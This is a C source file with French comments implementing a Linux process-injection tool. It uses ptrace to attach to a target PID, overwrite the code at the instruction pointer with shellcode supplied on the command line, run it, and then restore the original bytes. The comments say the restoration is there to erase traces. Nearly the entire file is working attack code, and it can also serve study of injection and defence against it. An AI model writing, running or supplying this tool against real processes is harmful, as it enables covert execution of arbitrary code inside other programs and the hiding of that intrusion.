/**
 * @file injection.c
 * @brief Injection de shellcode dans un processus distant avec ptrace.
 *
 * Ce programme injecte du shellcode dans un processus Linux à l'aide de ptrace.
 * Il sauvegarde le code original à RIP, insère le shellcode, l'exécute, puis
 * restaure l'état original.
 */

#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/user.h>
#include <sys/wait.h>
#include <unistd.h>

/**
 * @def CHECK(call, msg)
 * @brief Macro de vérification d'erreur ptrace.
 *
 * Elle vérifie si l'appel ptrace a échoué (retour -1) et affiche un message
 * d'erreur avec perror.
 */
#define CHECK(call, msg)                                                       \
  do {                                                                         \
    errno = 0;                                                                 \
    if ((call) == -1) {                                                        \
      perror("[!] " msg);                                                      \
      exit(EXIT_FAILURE);                                                      \
    }                                                                          \
  } while (0)

// Codes couleurs ANSI pour printf
#define COLOR_RESET   "\x1b[0m"
#define COLOR_GREEN   "\x1b[32m"
#define COLOR_YELLOW  "\x1b[33m"
#define COLOR_RED     "\x1b[31m"

/**
 * @brief Lit la mémoire du processus cible.
 *
 * La lecture se fait par blocs de taille `sizeof(long)` car ptrace lit la
 * mémoire en unités "machine word" (typiquement 8 octets sur x86_64).
 *
 * @param pid PID du processus cible.
 * @param addr Adresse de départ pour la lecture.
 * @param buffer Destination pour les données lues.
 * @param len Nombre total d'octets à lire.
 */
void read_mem(pid_t pid, long addr, char *buffer, int len) {
  union {
    long val;
    char bytes[sizeof(long)];
  } chunk;

  int chunks = len / sizeof(long); // Nombre de blocs complets
  int rem = len % sizeof(long);    // Reste éventuel (moins de 8 octets)

  for (int i = 0; i < chunks; i++) {
    chunk.val = ptrace(PTRACE_PEEKDATA, pid, addr + i * sizeof(long), NULL);
    memcpy(buffer + i * sizeof(long), chunk.bytes, sizeof(long));
  }

  // Lire les octets restants (s'il y a lieu)
  if (rem > 0) {
    chunk.val =
        ptrace(PTRACE_PEEKDATA, pid, addr + chunks * sizeof(long), NULL);
    memcpy(buffer + chunks * sizeof(long), chunk.bytes, rem);
  }
}

/**
 * @brief Écrit dans la mémoire du processus cible.
 *
 * Comme `PTRACE_POKEDATA` n'autorise que l’écriture d’un mot (8 octets),
 * les données sont copiées en morceaux de cette taille.
 *
 * @param pid PID du processus cible.
 * @param addr Adresse de départ pour l’écriture.
 * @param buffer Données à injecter.
 * @param len Taille en octets des données à écrire.
 */
void write_mem(pid_t target_pid, long addr, char *buffer, int len) {
  union data_chunk {
    long val;
    char bytes[sizeof(long)];
  } chunk;
  int i;

  // Écrire les mots complets
  for (i = 0; i < len / sizeof(long); i++) {
    memcpy(chunk.bytes, buffer + i * sizeof(long), sizeof(long));
    ptrace(PTRACE_POKEDATA, target_pid, addr + i * sizeof(long), chunk.val);
  }

  // Gérer les octets restants (partiels)
  int remaining = len % sizeof(long);
  if (remaining) {
    // Lire le mot original pour préserver les octets non modifiés
    chunk.val = ptrace(PTRACE_PEEKDATA, target_pid, addr + i * sizeof(long), NULL);

    // Copier uniquement la partie à modifier
    memcpy(chunk.bytes, buffer + i * sizeof(long), remaining);

    // Écrire le mot modifié complet
    ptrace(PTRACE_POKEDATA, target_pid, addr + i * sizeof(long), chunk.val);
  }
}

/**
 * @brief Fonction principale : injection du shellcode.
 *
 * Étapes :
 * 1. Attacher au processus
 * 2. Lire les registres
 * 3. Sauvegarder le code original
 * 4. Écrire le shellcode à la place
 * 5. Laisser exécuter
 * 6. Restaurer le code original
 * 7. Détacher
 */
int main(int argc, char *argv[]) {
  if (argc < 3) {
    fprintf(stderr, COLOR_RED "Usage: %s <pid> <raw shellcode>\n" COLOR_RESET, argv[0]);
    fprintf(stderr, COLOR_RED "Exemple: %s 1234 \"\\x48\\x31\\xff\\x6a\\x69...\"\n" COLOR_RESET,
            argv[0]);
    return EXIT_FAILURE;
  }

  pid_t target_pid = atoi(argv[1]);
  char *payload = argv[2];
  int payload_len =
      strlen(payload); // On s'attend à du shellcode brut (déjà décodé)

  // Allocation mémoire pour sauvegarder le code original à l'adresse RIP
  char *original_code = malloc(payload_len);
  if (!original_code) {
    perror("malloc");
    return EXIT_FAILURE;
  }

  struct user_regs_struct regs;

  // Étape 1 : Attache au processus distant
  printf(COLOR_YELLOW "[*] Attaching to PID %d...\n" COLOR_RESET, target_pid);
  CHECK(ptrace(PTRACE_ATTACH, target_pid, NULL, NULL), "ptrace attach");
  waitpid(target_pid, NULL, 0); // On attend que le processus cible soit stoppé suite à PTRACE_ATTACH

  // Étape 2 : Lecture des registres (notamment RIP)
  printf(COLOR_YELLOW "[*] Reading registers...\n" COLOR_RESET);
  CHECK(ptrace(PTRACE_GETREGS, target_pid, NULL, &regs), "ptrace getregs");

  // Étape 3 : Sauvegarde du code original présent à l’adresse RIP
  // Cela permet de restaurer l’état exact après exécution du shellcode
  printf(COLOR_YELLOW "[*] Backing up original code at 0x%llx\n" COLOR_RESET, regs.rip);
  read_mem(target_pid, regs.rip, original_code, payload_len);

  // Étape 4 : Écriture du shellcode à la place du code original
  printf(COLOR_YELLOW "[*] Injecting payload...\n" COLOR_RESET);
  write_mem(target_pid, regs.rip, payload, payload_len);

  // Étape 5 : Reprise de l’exécution — le shellcode est maintenant exécuté
  printf(COLOR_YELLOW "[*] Continuing execution...\n" COLOR_RESET);
  CHECK(ptrace(PTRACE_CONT, target_pid, NULL, NULL), "ptrace cont");

  // Attente que le processus cible s'arrête (ex : signal, fin du shellcode)
  // Cette attente est nécessaire pour garantir que le shellcode a fini
  // son exécution avant de restaurer la mémoire originale.
  waitpid(target_pid, NULL, 0);

  // Étape 6 : Restauration du code d'origine pour effacer toute trace
  // (utile pour discrétion ou stabilité du processus cible)
  printf(COLOR_YELLOW "[*] Restoring original code...\n" COLOR_RESET);
  write_mem(target_pid, regs.rip, original_code, payload_len);

  // Étape 7 : Détachement propre
  printf(COLOR_YELLOW "[*] Detaching...\n" COLOR_RESET);
  CHECK(ptrace(PTRACE_DETACH, target_pid, NULL, NULL), "ptrace detach");

  printf(COLOR_GREEN "[+] Injection complete.\n" COLOR_RESET);
  free(original_code);
  return EXIT_SUCCESS;
}
